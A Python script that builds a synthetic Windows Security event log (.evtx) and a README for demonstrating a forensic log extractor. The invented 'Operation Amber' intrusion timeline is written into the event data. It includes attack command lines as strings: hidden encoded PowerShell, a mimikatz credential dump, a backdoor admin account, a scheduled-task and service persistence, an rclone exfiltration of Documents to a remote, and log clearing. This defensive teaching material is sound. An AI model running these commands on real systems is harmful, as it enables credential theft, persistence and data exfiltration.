#!/usr/bin/env python3
"""Build a synthetic but genuine .evtx file for CQEVTXExtractor demos.

This writes the real binary format: a 4 KiB file header, 64 KiB chunks each
carrying a name pool, a template table and two CRC32 checksums, and per record
a Binary XML template instance with a typed substitution array. It is not a
mock. Windows opens the result in Event Viewer, which is the point: a sample
only this tool could read would prove nothing about this tool.

Using real templates also means the demo exercises the parts of a reader that
actually go wrong: template reuse across records, substitution arrays, typed
values (FILETIME, SID, GUID, HexInt64) and optional substitutions that resolve
to nothing and must therefore drop their attribute rather than render it empty.

The events retell "Operation Amber", the same intrusion the CQUSNCorrelate
demo data describes, on the same host and the same clock. That is deliberate.
Render this log to CSV, feed it to `CQUSNCorrelate sessions`, and the logon
sessions line up with the file creations in demo_J.bin, so the two tools
demonstrate together instead of each in isolation.

Everything here is invented. No real account, host or address appears.

Author:  Paula Januszkiewicz | CQURE
License: Apache License 2.0
"""

import binascii
import datetime as dt
import os
import struct
import sys
import uuid

CHUNK_SIZE = 65536
CHUNK_DATA_OFFSET = 512
FILE_HEADER_SIZE = 4096
FILETIME_EPOCH = dt.datetime(1601, 1, 1, tzinfo=dt.timezone.utc)

TOK_EOF = 0x00
TOK_OPEN_START = 0x01
TOK_CLOSE_START = 0x02
TOK_CLOSE_EMPTY = 0x03
TOK_END_ELEMENT = 0x04
TOK_VALUE = 0x05
TOK_ATTRIBUTE = 0x06
TOK_TEMPLATE = 0x0C
TOK_NORMAL_SUB = 0x0D
TOK_OPTIONAL_SUB = 0x0E
TOK_FRAGMENT = 0x0F

# Substitution value types
T_NULL, T_STR, T_U8, T_U16, T_U32, T_U64 = 0x00, 0x01, 0x04, 0x06, 0x08, 0x0A
T_GUID, T_FILETIME, T_SID, T_HEX64 = 0x0F, 0x11, 0x13, 0x15

EVENT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"


def filetime(moment):
    delta = moment - FILETIME_EPOCH
    return (int(delta.total_seconds()) * 10_000_000) + delta.microseconds * 10


def iso7(moment):
    return moment.strftime("%Y-%m-%dT%H:%M:%S.") + "{:07d}".format(moment.microsecond * 10) + "Z"


def name_hash(text):
    """The hash Windows uses to bucket names in the chunk string table."""
    value = 0
    for ch in text:
        value = (value * 65599 + ord(ch)) & 0xFFFF
    return value


def sid_bytes(text):
    """S-1-5-21-a-b-c-d to the binary SID layout."""
    parts = text.split("-")
    revision = int(parts[1])
    authority = int(parts[2])
    subs = [int(p) for p in parts[3:]]
    out = struct.pack("<BB", revision, len(subs))
    out += authority.to_bytes(6, "big")
    out += b"".join(struct.pack("<I", s) for s in subs)
    return out


def guid_bytes(text):
    return uuid.UUID(text.strip("{}")).bytes_le


def encode_value(vtype, value):
    """Return (type, bytes) for one substitution slot."""
    if value is None:
        return T_NULL, b""
    if vtype == T_STR:
        return vtype, value.encode("utf-16-le")
    if vtype == T_U8:
        return vtype, struct.pack("<B", value)
    if vtype == T_U16:
        return vtype, struct.pack("<H", value)
    if vtype == T_U32:
        return vtype, struct.pack("<I", value)
    if vtype in (T_U64, T_HEX64):
        return vtype, struct.pack("<Q", value)
    if vtype == T_GUID:
        return vtype, guid_bytes(value)
    if vtype == T_FILETIME:
        return vtype, struct.pack("<Q", filetime(value))
    if vtype == T_SID:
        return vtype, sid_bytes(value)
    raise ValueError("unsupported substitution type 0x{:02x}".format(vtype))


class Sub(object):
    """A placeholder in a template, filled per record from the value array."""

    __slots__ = ("index", "vtype", "optional")

    def __init__(self, index, vtype, optional=False):
        self.index = index
        self.vtype = vtype
        self.optional = optional


class Element(object):
    """A small XML node. Text and attribute values may be str or Sub."""

    __slots__ = ("tag", "attrs", "text", "children")

    def __init__(self, tag, attrs=None, text=None, children=None):
        self.tag = tag
        self.attrs = attrs or []
        self.text = text
        self.children = children or []


class ChunkWriter(object):
    """Builds one 64 KiB chunk: names, template definitions and records."""

    def __init__(self):
        self.buf = bytearray()
        self.base = CHUNK_DATA_OFFSET   # chunk offset that self.buf[0] occupies
        self.names = {}                 # name text to chunk relative offset
        self.name_order = []
        self.templates = {}             # shape key to (definition offset, id)
        self.template_order = []
        self.last_record_offset = CHUNK_DATA_OFFSET

    @property
    def cursor(self):
        """Chunk relative offset of the next byte to be written.

        Name and template offsets are relative to the chunk, not to the record,
        so this has to stay true while a record body is built in its own
        buffer. Getting it wrong writes offsets pointing into the previous
        record, and Windows rejects the file outright.
        """
        return self.base + len(self.buf)

    # ---------------------------------------------------------------- pieces

    def _name_ref(self, text):
        """Offset of a name, plus the bytes to append if it is new.

        The caller must reserve the four byte offset field BEFORE calling this,
        otherwise the offset recorded is where the field sits rather than where
        the name struct lands.
        """
        if text in self.names:
            return self.names[text], b""
        offset = self.cursor
        blob = struct.pack("<IHH", 0, name_hash(text), len(text))
        blob += text.encode("utf-16-le") + b"\x00\x00"
        self.names[text] = offset
        self.name_order.append(text)
        return offset, blob

    def _emit_name(self, text):
        at = len(self.buf)
        self.buf += struct.pack("<I", 0)
        offset, inline = self._name_ref(text)
        struct.pack_into("<I", self.buf, at, offset)
        self.buf += inline

    def _emit_content(self, value):
        """A literal Value token, or a substitution placeholder."""
        if isinstance(value, Sub):
            token = TOK_OPTIONAL_SUB if value.optional else TOK_NORMAL_SUB
            self.buf += struct.pack("<BHB", token, value.index, value.vtype)
        else:
            self.buf += struct.pack("<BBH", TOK_VALUE, T_STR, len(value))
            self.buf += value.encode("utf-16-le")

    def write_element(self, element):
        """Append one element and everything under it."""
        has_attrs = bool(element.attrs)
        start = len(self.buf)
        self.buf += struct.pack("<BHI", TOK_OPEN_START | (0x40 if has_attrs else 0),
                                0xFFFF, 0)
        size_at = start + 3
        self._emit_name(element.tag)

        if has_attrs:
            attr_start = len(self.buf)
            self.buf += struct.pack("<I", 0)
            for index, (attr_name, attr_value) in enumerate(element.attrs):
                last = index == len(element.attrs) - 1
                self.buf += struct.pack("<B", TOK_ATTRIBUTE | (0x00 if last else 0x40))
                self._emit_name(attr_name)
                self._emit_content(attr_value)
            struct.pack_into("<I", self.buf, attr_start, len(self.buf) - attr_start - 4)

        if not element.children and element.text is None:
            self.buf += struct.pack("<B", TOK_CLOSE_EMPTY)
        else:
            self.buf += struct.pack("<B", TOK_CLOSE_START)
            if element.text is not None:
                self._emit_content(element.text)
            for child in element.children:
                self.write_element(child)
            self.buf += struct.pack("<B", TOK_END_ELEMENT)

        struct.pack_into("<I", self.buf, size_at, len(self.buf) - size_at - 4)

    def _write_template_body(self, root):
        self.buf += struct.pack("<BBBB", TOK_FRAGMENT, 0x01, 0x01, 0x00)
        self.write_element(root)
        self.buf += struct.pack("<B", TOK_EOF)

    def write_record(self, record_id, moment, key, root, values):
        """Frame one record: template instance, definition if new, then values."""
        record_start = self.cursor
        saved_buf, saved_base = self.buf, self.base
        self.buf = bytearray()
        self.base = record_start + 24        # Binary XML starts after the header

        self.buf += struct.pack("<BBBB", TOK_FRAGMENT, 0x01, 0x01, 0x00)

        known = self.templates.get(key)
        template_id = known[1] if known else (0x416D6200 + len(self.templates))
        self.buf += struct.pack("<BBI", TOK_TEMPLATE, 0x01, template_id)
        offset_at = len(self.buf)
        self.buf += struct.pack("<I", 0)

        if known is None:
            # A resident definition sits immediately after this ten byte
            # header. Later records naming the same shape point back at it,
            # which is exactly what a chunk full of 4688s does.
            definition = self.cursor
            struct.pack_into("<I", self.buf, offset_at, definition)
            self.buf += struct.pack("<I", 0)                       # next in bucket
            self.buf += struct.pack("<I", template_id) + b"\x00" * 12   # id and GUID
            size_at = len(self.buf)
            self.buf += struct.pack("<I", 0)
            body_start = len(self.buf)
            self._write_template_body(root)
            struct.pack_into("<I", self.buf, size_at, len(self.buf) - body_start)
            self.templates[key] = (definition, template_id)
            self.template_order.append(key)
        else:
            struct.pack_into("<I", self.buf, offset_at, known[0])

        # Substitution array: a descriptor table, then the values back to back.
        encoded = [encode_value(vtype, value) for vtype, value in values]
        self.buf += struct.pack("<I", len(encoded))
        for vtype, blob in encoded:
            self.buf += struct.pack("<HBB", len(blob), vtype, 0)
        for _vtype, blob in encoded:
            self.buf += blob

        self.buf += struct.pack("<B", TOK_EOF)

        body = self.buf
        self.buf, self.base = saved_buf, saved_base

        size = 24 + len(body) + 4
        padding = (-size) % 8
        size += padding
        self.buf += struct.pack("<IIQQ", 0x00002A2A, size, record_id, filetime(moment))
        self.buf += body + b"\x00" * padding
        self.buf += struct.pack("<I", size)
        return size

    def finish(self, first_number, last_number, first_id, last_id):
        """Emit the full 64 KiB chunk with both checksums in place."""
        chunk = bytearray(CHUNK_SIZE)
        chunk[CHUNK_DATA_OFFSET:CHUNK_DATA_OFFSET + len(self.buf)] = self.buf
        free_space = CHUNK_DATA_OFFSET + len(self.buf)

        chunk[0:8] = b"ElfChnk\x00"
        struct.pack_into("<QQQQ", chunk, 8, first_number, last_number, first_id, last_id)
        struct.pack_into("<IIII", chunk, 40, 128, self.last_record_offset, free_space, 0)
        struct.pack_into("<I", chunk, 120, 1)

        # String table: 64 buckets of name offsets, chained through the first
        # dword of each name struct.
        buckets = [0] * 64
        for text in self.name_order:
            offset = self.names[text]
            bucket = name_hash(text) % 64
            struct.pack_into("<I", chunk, offset, buckets[bucket])
            buckets[bucket] = offset
        for index, offset in enumerate(buckets):
            struct.pack_into("<I", chunk, 128 + index * 4, offset)

        # Template table: 32 buckets, chained the same way.
        tbuckets = [0] * 32
        for key in self.template_order:
            offset, template_id = self.templates[key]
            bucket = template_id % 32
            struct.pack_into("<I", chunk, offset, tbuckets[bucket])
            tbuckets[bucket] = offset
        for index, offset in enumerate(tbuckets):
            struct.pack_into("<I", chunk, 384 + index * 4, offset)

        struct.pack_into("<I", chunk, 52,
                         binascii.crc32(bytes(chunk[CHUNK_DATA_OFFSET:free_space])) & 0xFFFFFFFF)
        struct.pack_into("<I", chunk, 124,
                         binascii.crc32(bytes(chunk[:120]) + bytes(chunk[128:512])) & 0xFFFFFFFF)
        return bytes(chunk)


# ----------------------------------------------------------------- templates

# Fixed slots every event carries, then one slot per EventData field.
FIXED = [
    ("provider", T_STR), ("guid", T_GUID), ("event_id", T_U16), ("level", T_U8),
    ("task", T_U16), ("keywords", T_HEX64), ("time", T_FILETIME),
    ("record_id", T_U64), ("pid", T_U32), ("tid", T_U32),
    ("channel", T_STR), ("computer", T_STR), ("sid", T_SID),
]
BASE = len(FIXED)


def template_for(field_names):
    """The Binary XML skeleton shared by every event with these fields."""
    return Element("Event", [("xmlns", EVENT_NS)], children=[
        Element("System", children=[
            Element("Provider", [("Name", Sub(0, T_STR)), ("Guid", Sub(1, T_GUID))]),
            Element("EventID", text=Sub(2, T_U16)),
            Element("Version", text="0"),
            Element("Level", text=Sub(3, T_U8)),
            Element("Task", text=Sub(4, T_U16)),
            Element("Opcode", text="0"),
            Element("Keywords", text=Sub(5, T_HEX64)),
            Element("TimeCreated", [("SystemTime", Sub(6, T_FILETIME))]),
            Element("EventRecordID", text=Sub(7, T_U64)),
            Element("Correlation"),
            Element("Execution", [("ProcessID", Sub(8, T_U32)),
                                  ("ThreadID", Sub(9, T_U32))]),
            Element("Channel", text=Sub(10, T_STR)),
            Element("Computer", text=Sub(11, T_STR)),
            # Optional: a system generated event has no subject SID, and the
            # attribute must then disappear rather than render empty.
            Element("Security", [("UserID", Sub(12, T_SID, optional=True))]),
        ]),
        Element("EventData", children=[
            Element("Data", [("Name", name)], text=Sub(BASE + i, T_STR))
            for i, name in enumerate(field_names)
        ]),
    ])


# ----------------------------------------------------------------- scenario

HOST = "WKS-041.corp.local"
SEC_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
SEC_PROVIDER = "Microsoft-Windows-Security-Auditing"
JDOE_SID = "S-1-5-21-1004336348-1177238915-682003330-1417"
ADM_SID = "S-1-5-21-1004336348-1177238915-682003330-1583"
NEW_SID = "S-1-5-21-1004336348-1177238915-682003330-1602"
DAY = dt.datetime(2026, 3, 17, tzinfo=dt.timezone.utc)


def at(hour, minute, second=0, micro=0):
    return DAY.replace(hour=hour, minute=minute, second=second, microsecond=micro)


def logon(moment, user, logon_id, logon_type, sid, ip="-", workstation="WKS-041",
          process="C:\\Windows\\System32\\lsass.exe"):
    return (moment, 4624, 0, 12544, None, [
        ("SubjectUserSid", "S-1-5-18"), ("SubjectUserName", "WKS-041$"),
        ("SubjectDomainName", "CORP"), ("SubjectLogonId", "0x3e7"),
        ("TargetUserSid", sid), ("TargetUserName", user),
        ("TargetDomainName", "CORP"), ("TargetLogonId", logon_id),
        ("LogonType", str(logon_type)), ("LogonProcessName", "Advapi  "),
        ("AuthenticationPackageName", "Negotiate"), ("WorkstationName", workstation),
        ("ProcessName", process), ("IpAddress", ip),
        ("IpPort", "0" if ip == "-" else "49721"),
    ])


def logoff(moment, user, logon_id, logon_type, sid):
    return (moment, 4634, 0, 12545, None, [
        ("TargetUserSid", sid), ("TargetUserName", user),
        ("TargetDomainName", "CORP"), ("TargetLogonId", logon_id),
        ("LogonType", str(logon_type)),
    ])


def process_create(moment, user, logon_id, sid, image, command, parent, pid="0x1a4c"):
    return (moment, 4688, 0, 13312, sid, [
        ("SubjectUserSid", sid), ("SubjectUserName", user),
        ("SubjectDomainName", "CORP"), ("SubjectLogonId", logon_id),
        ("NewProcessId", pid), ("NewProcessName", image),
        ("TokenElevationType", "%%1936"), ("ProcessId", "0x2f0"),
        ("CommandLine", command), ("ParentProcessName", parent),
    ])


def build_events():
    """The Operation Amber timeline, in the order the host recorded it."""
    events = [
        logon(at(8, 40), "svc_backup", "0x2f1a", 5, JDOE_SID,
              process="C:\\Windows\\System32\\services.exe"),
        process_create(at(8, 41, 12), "svc_backup", "0x2f1a", JDOE_SID,
                       "C:\\Program Files\\Backup\\nightly.exe", "nightly.exe --full",
                       "C:\\Windows\\System32\\services.exe"),
        logon(at(9, 2), "jdoe", "0x4c7b", 2, JDOE_SID),
        logoff(at(9, 5), "svc_backup", "0x2f1a", 5, JDOE_SID),
        process_create(at(10, 1, 20), "jdoe", "0x4c7b", JDOE_SID,
                       "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
                       '"WINWORD.EXE" /n "C:\\Users\\jdoe\\Downloads\\invoice_2026.docm"',
                       "C:\\Windows\\explorer.exe"),
        process_create(at(10, 4, 10), "jdoe", "0x4c7b", JDOE_SID,
                       "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe",
                       "svchost32.exe -s",
                       "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"),
        (at(10, 4, 11), 4648, 0, 12544, JDOE_SID, [
            ("SubjectUserName", "jdoe"), ("SubjectDomainName", "CORP"),
            ("SubjectLogonId", "0x4c7b"), ("TargetUserName", "jdoe_adm"),
            ("TargetDomainName", "CORP"), ("TargetServerName", "WKS-041"),
            ("ProcessName", "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe"),
            ("IpAddress", "10.10.7.66"),
        ]),
        logon(at(10, 12), "jdoe_adm", "0x6e29", 10, ADM_SID,
              ip="10.10.7.66", workstation="KALI-7"),
        (at(10, 12, 1), 4672, 0, 12548, ADM_SID, [
            ("SubjectUserSid", ADM_SID), ("SubjectUserName", "jdoe_adm"),
            ("SubjectDomainName", "CORP"), ("SubjectLogonId", "0x6e29"),
            ("PrivilegeList", "SeDebugPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\t"
                              "SeTakeOwnershipPrivilege"),
        ]),
    ]

    for minute, second, tool, args in (
            (19, 4, "whoami.exe", "whoami /all"),
            (19, 22, "net.exe", 'net group "Domain Admins" /domain'),
            (19, 51, "ipconfig.exe", "ipconfig /all"),
            (20, 15, "nltest.exe", "nltest /domain_trusts")):
        events.append(process_create(at(10, minute, second), "jdoe_adm", "0x6e29", ADM_SID,
                                     "C:\\Windows\\System32\\" + tool, args,
                                     "C:\\Windows\\System32\\cmd.exe"))

    events += [
        process_create(at(10, 16, 40), "jdoe_adm", "0x6e29", ADM_SID,
                       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "powershell.exe -nop -w hidden -enc SQBFAFgA",
                       "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe"),
        process_create(at(10, 31, 8), "jdoe_adm", "0x6e29", ADM_SID,
                       "C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimi.exe",
                       "mimi.exe privilege::debug sekurlsa::logonpasswords exit",
                       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        (at(10, 31, 14), 4673, 0, 13056, ADM_SID, [
            ("SubjectUserName", "jdoe_adm"), ("SubjectDomainName", "CORP"),
            ("SubjectLogonId", "0x6e29"),
            ("ProcessName", "C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimi.exe"),
            ("PrivilegeList", "SeDebugPrivilege"), ("Service", "-"),
        ]),
        (at(11, 5, 0), 4720, 0, 13824, ADM_SID, [
            ("TargetUserName", "svc_update"), ("TargetDomainName", "WKS-041"),
            ("TargetSid", NEW_SID), ("SubjectUserName", "jdoe_adm"),
            ("SubjectDomainName", "CORP"), ("SubjectLogonId", "0x6e29"),
            ("SamAccountName", "svc_update"), ("DisplayName", "-"),
        ]),
        (at(11, 5, 12), 4732, 0, 13826, ADM_SID, [
            ("MemberName", "-"), ("MemberSid", NEW_SID),
            ("TargetUserName", "Administrators"), ("TargetDomainName", "Builtin"),
            ("SubjectUserName", "jdoe_adm"), ("SubjectDomainName", "CORP"),
            ("SubjectLogonId", "0x6e29"),
        ]),
        (at(11, 5, 35), 4698, 0, 12804, ADM_SID, [
            ("SubjectUserName", "jdoe_adm"), ("SubjectDomainName", "CORP"),
            ("SubjectLogonId", "0x6e29"), ("TaskName", "\\UpdateHealthCheck"),
            ("TaskContent", '<?xml version="1.0"?><Task><Actions><Exec><Command>'
                            'C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe'
                            '</Command></Exec></Actions></Task>'),
        ]),
        (at(11, 6, 5), 4697, 0, 12292, ADM_SID, [
            ("SubjectUserName", "jdoe_adm"), ("SubjectDomainName", "CORP"),
            ("SubjectLogonId", "0x6e29"), ("ServiceName", "UpdateHealthCheck"),
            ("ServiceFileName",
             "C:\\Users\\jdoe\\AppData\\Local\\Temp\\svchost32.exe -k netsvcs"),
            ("ServiceType", "0x10"), ("ServiceStartType", "2"),
            ("ServiceAccount", "LocalSystem"),
        ]),
        process_create(at(11, 14, 2), "jdoe_adm", "0x6e29", ADM_SID,
                       "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rclone.exe",
                       "rclone.exe copy C:\\Users\\jdoe\\Documents remote:amber",
                       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
    ]

    for offset in (0, 9):
        events.append((at(11, 22, 30 + offset), 4625, 0, 12544, None, [
            ("SubjectUserSid", "S-1-0-0"), ("TargetUserName", "administrator"),
            ("TargetDomainName", "CORP"), ("Status", "0xC000006D"),
            ("SubStatus", "0xC000006A"), ("LogonType", "3"),
            ("IpAddress", "10.10.7.66"), ("WorkstationName", "KALI-7"),
        ]))

    events += [
        (at(11, 31, 0), 1102, 0, 104, ADM_SID, [
            ("SubjectUserSid", ADM_SID), ("SubjectUserName", "jdoe_adm"),
            ("SubjectDomainName", "CORP"), ("SubjectLogonId", "0x6e29"),
        ]),
        logoff(at(17, 30), "jdoe", "0x4c7b", 2, JDOE_SID),
    ]
    return events


def build_log(path):
    events = build_events()
    chunks = []
    writer = ChunkWriter()
    first_id = 1
    record_id = 1

    for moment, event_id, level, task, sid, data in events:
        field_names = tuple(name for name, _ in data)
        key = field_names
        root = template_for(field_names)
        keywords = 0x8010000000000000 if event_id == 4625 else 0x8020000000000000
        values = [
            (T_STR, SEC_PROVIDER), (T_GUID, SEC_GUID), (T_U16, event_id),
            (T_U8, level), (T_U16, task), (T_HEX64, keywords),
            (T_FILETIME, moment), (T_U64, record_id), (T_U32, 728), (T_U32, 812),
            (T_STR, "Security"), (T_STR, HOST), (T_SID, sid),
        ] + [(T_STR, value) for _name, value in data]

        probe = ChunkWriter()
        probe.names = dict(writer.names)
        probe.name_order = list(writer.name_order)
        probe.templates = dict(writer.templates)
        probe.template_order = list(writer.template_order)
        probe.buf = bytearray(writer.buf)
        probe.base = writer.base
        probe.last_record_offset = writer.last_record_offset
        offset_before = probe.cursor
        probe.write_record(record_id, moment, key, root, values)

        if probe.cursor > CHUNK_SIZE:
            chunks.append(writer.finish(first_id, record_id - 1, first_id, record_id - 1))
            writer = ChunkWriter()
            first_id = record_id
            offset_before = writer.cursor
            writer.write_record(record_id, moment, key, root, values)
        else:
            writer = probe
        writer.last_record_offset = offset_before
        record_id += 1

    chunks.append(writer.finish(first_id, record_id - 1, first_id, record_id - 1))

    header = bytearray(FILE_HEADER_SIZE)
    header[0:8] = b"ElfFile\x00"
    struct.pack_into("<QQQIHHHH", header, 8, 0, len(chunks) - 1, record_id, 128, 2, 3,
                     FILE_HEADER_SIZE, len(chunks))
    struct.pack_into("<I", header, 120, 0)
    struct.pack_into("<I", header, 124, binascii.crc32(bytes(header[:120])) & 0xFFFFFFFF)

    with open(path, "wb") as handle:
        handle.write(bytes(header))
        for chunk in chunks:
            handle.write(chunk)
    return len(events), len(chunks)


README = """# Demo dataset, Operation Amber

`demo_Security.evtx` is a real .evtx file, written by `make_demo_data.py` in the
actual binary format: file header, 64 KiB chunks, string and template tables,
CRC32 checksums, and Binary XML records built from templates with typed
substitution arrays. Windows opens it, and so does Event Viewer.

Everything in it is invented. No real account, host or address appears.

```
"Operation Amber", host WKS-041, 17 March 2026 (UTC)
----------------------------------------------------
    08:40  svc_backup logs on as a service (0x2f1a), runs the nightly job
    09:02  jdoe logs on interactively (0x4c7b)
    09:05  svc_backup logs off
    10:01  WINWORD opens invoice_2026.docm from Downloads
    10:04  svchost32.exe runs from AppData Temp, parented by WINWORD
    10:12  jdoe_adm logs on over RDP from 10.10.7.66, and never logs off
    10:16  encoded PowerShell, parented by the dropper
    10:19  recon: whoami, net group, ipconfig, nltest
    10:31  mimi.exe runs and is granted SeDebugPrivilege
    11:05  local account svc_update created, added to Administrators
    11:05  scheduled task \\UpdateHealthCheck created
    11:06  service UpdateHealthCheck installed, pointing at the dropper
    11:14  rclone.exe copies Documents to a remote
    11:22  two failed logons for 'administrator' from KALI-7
    11:31  the Security log is cleared (1102)
    17:30  jdoe logs off
```

## What each command should surface

```
info      1 file, {chunks} chunk(s), every CRC32 valid, clean dirty flag
stats     4688 is the most common event ID, one provider, one computer
dump      {events} events across 17 March 2026
          --event-id 4624       three logons: 0x2f1a, 0x4c7b, 0x6e29
          --event-id 4625       the two failures from 10.10.7.66
          --contains mimi.exe   the credential theft
          --after 2026-03-17T11:00:00Z   the destructive tail of the intrusion
evtxecmd  --sessions-only exports the logon events for CQUSNCorrelate
```

Note the 4624 and 4625 records: they have no Security UserID, so the optional
substitution behind that attribute resolves to nothing and the attribute is
absent rather than empty. Compare `dump --event-id 4624 --print-xml` against
`--event-id 4688`, which does carry one.

## The point of the shared timeline

These events sit on the same host and the same clock as `demo_J.bin` in
CQUSNCorrelate. Render this log and hand it over:

```
py -3 CQEVTXExtractor.py evtxecmd -i samples/demo_Security.evtx --sessions-only -o amber.csv
py -3 CQUSNCorrelate.py sessions --input samples/demo_J.bin --evtx amber.csv
```

The 0x6e29 session opens at 10:12 and never logs off, so the tool should warn
about over-attribution rather than silently claim every later file belongs to
it. That warning is the lesson: an open session is not evidence that the
session did everything after it.
"""


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "samples"
    os.makedirs(target, exist_ok=True)
    path = os.path.join(target, "demo_Security.evtx")
    events, chunks = build_log(path)
    print("wrote {}  {:,} events, {} chunk(s), {:,} bytes".format(
        path, events, chunks, os.path.getsize(path)))

    readme = os.path.join(target, "demo_README.md")
    with open(readme, "w", encoding="utf-8", newline="\n") as handle:
        handle.write(README.format(events=events, chunks=chunks))
    print("wrote {}".format(readme))


if __name__ == "__main__":
    main()
